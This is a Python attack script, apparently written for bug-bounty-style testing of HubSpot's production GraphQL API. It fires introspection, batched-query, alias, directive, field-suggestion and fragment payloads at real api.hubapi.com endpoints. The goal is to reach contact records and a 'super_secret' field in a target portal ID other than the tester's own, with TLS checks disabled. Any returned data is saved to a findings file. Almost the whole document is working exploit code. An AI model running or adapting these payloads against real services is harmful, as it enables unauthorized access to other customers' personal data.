#!/usr/bin/env python3
"""
GraphQL Authorization Bypass Testing

Tests GraphQL-specific vulnerabilities:
- Introspection without authentication
- Query batching to bypass authorization
- Field-level authorization bypass
- Directive abuse
- Alias-based bypasses
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("GraphQL Authorization Bypass Testing")
print("="*80)
print("\nTests GraphQL-specific auth bypasses")
print("User noted: No GraphQL scope available in token")
print("="*80)

findings = []

# Possible GraphQL endpoints
GRAPHQL_ENDPOINTS = [
    'https://api.hubapi.com/graphql',
    'https://api.hubapi.com/graphql/v1',
    'https://api.hubapi.com/graphql/v2',
    'https://api.hubapi.com/collector/graphql',
    'https://api.hubspot.com/graphql',
    f'https://api.hubapi.com/graphql?portalId={TARGET_PORTAL}',
]

# ============================================================================
# 1. INTROSPECTION WITHOUT AUTH
# ============================================================================

def test_introspection_no_auth():
    """Try introspection without authentication"""
    print("\n[*] Testing GraphQL introspection without auth...")

    introspection_query = {
        "query": """
        {
            __schema {
                types {
                    name
                    fields {
                        name
                        type {
                            name
                        }
                    }
                }
            }
        }
        """
    }

    for endpoint in GRAPHQL_ENDPOINTS:
        try:
            print(f"\n  Endpoint: {endpoint.split('hubapi')[1] if 'hubapi' in endpoint else endpoint.split('hubspot')[1]}")

            # Try without auth
            r = requests.post(
                endpoint,
                json=introspection_query,
                headers={'Content-Type': 'application/json'},
                verify=False,
                timeout=10
            )

            print(f"  No auth: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    if '__schema' in data.get('data', {}):
                        print(f"  *** INTROSPECTION ALLOWED WITHOUT AUTH ***")
                        schema_types = data['data']['__schema']['types']
                        print(f"  Found {len(schema_types)} types in schema")

                        # Look for interesting types
                        for t in schema_types:
                            if 'contact' in t['name'].lower() or 'portal' in t['name'].lower():
                                print(f"    - {t['name']}")

                        findings.append({
                            'attack': 'GraphQL Introspection Without Auth',
                            'endpoint': endpoint,
                            'types_count': len(schema_types)
                        })
                except:
                    print(f"  Response: {r.text[:150]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 2. INTROSPECTION WITH TOKEN
# ============================================================================

def test_introspection_with_token():
    """Try introspection with our token"""
    print("\n[*] Testing GraphQL introspection with token...")

    introspection_query = {
        "query": """
        {
            __schema {
                queryType { name }
                mutationType { name }
                types {
                    name
                    kind
                    description
                }
            }
        }
        """
    }

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    for endpoint in GRAPHQL_ENDPOINTS:
        try:
            r = requests.post(endpoint, json=introspection_query, headers=headers, verify=False, timeout=10)

            if r.status_code == 200:
                try:
                    data = r.json()
                    if '__schema' in data.get('data', {}):
                        print(f"\n  SUCCESS at: {endpoint}")
                        schema = data['data']['__schema']

                        print(f"  Query type: {schema.get('queryType', {}).get('name')}")
                        print(f"  Mutation type: {schema.get('mutationType', {}).get('name')}")
                        print(f"  Types: {len(schema.get('types', []))}")

                        findings.append({
                            'attack': 'GraphQL Introspection With Token',
                            'endpoint': endpoint,
                            'schema': schema
                        })
                except:
                    pass

        except Exception as e:
            pass

# ============================================================================
# 3. QUERY BATCHING BYPASS
# ============================================================================

def test_query_batching():
    """Test if batching multiple queries bypasses authorization"""
    print("\n[*] Testing GraphQL query batching...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Batch multiple queries together
    batch_query = {
        "query": """
        query GetContacts {
            contact1: contact(id: "1", portalId: "%s") { id firstname email }
            contact2: contact(id: "2", portalId: "%s") { id firstname email }
            contact3: contact(id: "3", portalId: "%s") { id firstname email }
        }
        """ % (TARGET_PORTAL, TARGET_PORTAL, TARGET_PORTAL)
    }

    for endpoint in GRAPHQL_ENDPOINTS:
        try:
            r = requests.post(endpoint, json=batch_query, headers=headers, verify=False, timeout=10)

            print(f"\n  {endpoint.split('hubapi')[1] if 'hubapi' in endpoint else endpoint.split('hubspot')[1]}: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"  Response: {json.dumps(data, indent=2)[:300]}")

                    if 'data' in data and any('contact' in str(k) for k in data['data'].keys()):
                        print(f"  *** GOT CONTACT DATA VIA BATCHING ***")
                        findings.append({
                            'attack': 'GraphQL Batch Query',
                            'endpoint': endpoint,
                            'data': data
                        })
                except:
                    print(f"  Response: {r.text[:200]}")

        except Exception as e:
            pass

# ============================================================================
# 4. ALIAS-BASED BYPASS
# ============================================================================

def test_alias_bypass():
    """Test using aliases to bypass field restrictions"""
    print("\n[*] Testing alias-based bypass...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Use aliases to potentially confuse authorization
    alias_queries = [
        # Rename super_secret to look like normal field
        {
            "query": """
            {
                contact(id: "1", portalId: "%s") {
                    id
                    firstname
                    email_field: super_secret
                }
            }
            """ % TARGET_PORTAL
        },
        # Multiple aliases for same field
        {
            "query": """
            {
                contact(id: "1", portalId: "%s") {
                    field1: super_secret
                    field2: super_secret
                    field3: super_secret
                }
            }
            """ % TARGET_PORTAL
        },
        # Nested aliases
        {
            "query": """
            {
                c1: contact(id: "1", portalId: "%s") {
                    s: super_secret
                }
            }
            """ % TARGET_PORTAL
        },
    ]

    for endpoint in GRAPHQL_ENDPOINTS[:2]:  # Test main endpoints
        for i, query in enumerate(alias_queries, 1):
            try:
                r = requests.post(endpoint, json=query, headers=headers, verify=False, timeout=10)

                if r.status_code == 200:
                    try:
                        data = r.json()
                        if 'data' in data and data['data']:
                            print(f"\n  Alias test {i} SUCCESS")
                            print(f"  Data: {json.dumps(data, indent=2)[:200]}")

                            findings.append({
                                'attack': 'GraphQL Alias Bypass',
                                'endpoint': endpoint,
                                'query': query,
                                'data': data
                            })
                    except:
                        pass

            except Exception as e:
                pass

# ============================================================================
# 5. DIRECTIVE ABUSE
# ============================================================================

def test_directive_abuse():
    """Test directive abuse (@skip, @include, etc.)"""
    print("\n[*] Testing GraphQL directive abuse...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    directive_queries = [
        # @include directive
        {
            "query": """
            query($include: Boolean!) {
                contact(id: "1", portalId: "%s") {
                    id
                    firstname
                    super_secret @include(if: $include)
                }
            }
            """ % TARGET_PORTAL,
            "variables": {"include": True}
        },
        # @skip directive
        {
            "query": """
            query($skip: Boolean!) {
                contact(id: "1", portalId: "%s") {
                    id
                    super_secret @skip(if: $skip)
                }
            }
            """ % TARGET_PORTAL,
            "variables": {"skip": False}
        },
        # Custom directives
        {
            "query": """
            {
                contact(id: "1", portalId: "%s") @bypass {
                    super_secret
                }
            }
            """ % TARGET_PORTAL
        },
    ]

    for endpoint in GRAPHQL_ENDPOINTS[:2]:
        for i, payload in enumerate(directive_queries, 1):
            try:
                r = requests.post(endpoint, json=payload, headers=headers, verify=False, timeout=10)

                if r.status_code == 200:
                    try:
                        data = r.json()
                        if 'data' in data and data['data']:
                            print(f"\n  Directive test {i} at {endpoint}: SUCCESS")
                            print(f"  Data: {json.dumps(data, indent=2)[:200]}")

                            findings.append({
                                'attack': 'GraphQL Directive Abuse',
                                'endpoint': endpoint,
                                'data': data
                            })
                    except:
                        pass

            except Exception as e:
                pass

# ============================================================================
# 6. FIELD SUGGESTIONS
# ============================================================================

def test_field_suggestions():
    """Test if error messages reveal field names"""
    print("\n[*] Testing field suggestions in errors...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Query non-existent field to get suggestions
    suggestion_query = {
        "query": """
        {
            contact(id: "1", portalId: "%s") {
                id
                nonexistent_field_12345
            }
        }
        """ % TARGET_PORTAL
    }

    for endpoint in GRAPHQL_ENDPOINTS[:2]:
        try:
            r = requests.post(endpoint, json=suggestion_query, headers=headers, verify=False, timeout=10)

            if r.status_code in [200, 400]:
                try:
                    data = r.json()
                    errors = data.get('errors', [])

                    if errors:
                        print(f"\n  Endpoint: {endpoint}")
                        for error in errors:
                            msg = error.get('message', '')
                            print(f"  Error: {msg[:150]}")

                            # Check if error reveals field names
                            if 'Did you mean' in msg or 'suggestion' in msg.lower():
                                print(f"  *** ERROR REVEALS FIELD NAMES ***")
                                findings.append({
                                    'attack': 'GraphQL Field Suggestion',
                                    'endpoint': endpoint,
                                    'error': error
                                })
                except:
                    pass

        except Exception as e:
            pass

# ============================================================================
# 7. FRAGMENTS AND SPREADS
# ============================================================================

def test_fragments():
    """Test fragment-based bypasses"""
    print("\n[*] Testing GraphQL fragments...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    fragment_query = {
        "query": """
        fragment SecretFields on Contact {
            super_secret
            firstname
        }

        query {
            contact(id: "1", portalId: "%s") {
                ...SecretFields
            }
        }
        """ % TARGET_PORTAL
    }

    for endpoint in GRAPHQL_ENDPOINTS[:2]:
        try:
            r = requests.post(endpoint, json=fragment_query, headers=headers, verify=False, timeout=10)

            if r.status_code == 200:
                try:
                    data = r.json()
                    if 'data' in data and data['data']:
                        print(f"\n  Fragment query SUCCESS at: {endpoint}")
                        print(f"  Data: {json.dumps(data, indent=2)[:200]}")

                        findings.append({
                            'attack': 'GraphQL Fragment Bypass',
                            'endpoint': endpoint,
                            'data': data
                        })
                except:
                    pass

        except Exception as e:
            pass

# ============================================================================
# MAIN EXECUTION
# ============================================================================

test_introspection_no_auth()
test_introspection_with_token()
test_query_batching()
test_alias_bypass()
test_directive_abuse()
test_field_suggestions()
test_fragments()

print("\n" + "="*80)
print(f"GraphQL Testing Complete")
print(f"Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n*** POTENTIAL GraphQL VULNERABILITIES ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding['attack']}")
        print(f"   {json.dumps(finding, indent=3)[:400]}...")
        print()

    with open('/home/user/Hub/findings/graphql_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("Saved to: findings/graphql_findings.json")
else:
    print("\nNo GraphQL vulnerabilities found.")
    print("\nThis means:")
    print("  - GraphQL endpoints require proper authentication")
    print("  - Introspection is disabled or protected")
    print("  - Field-level authorization is enforced")
    print("  - No bypass via batching, aliases, or directives")
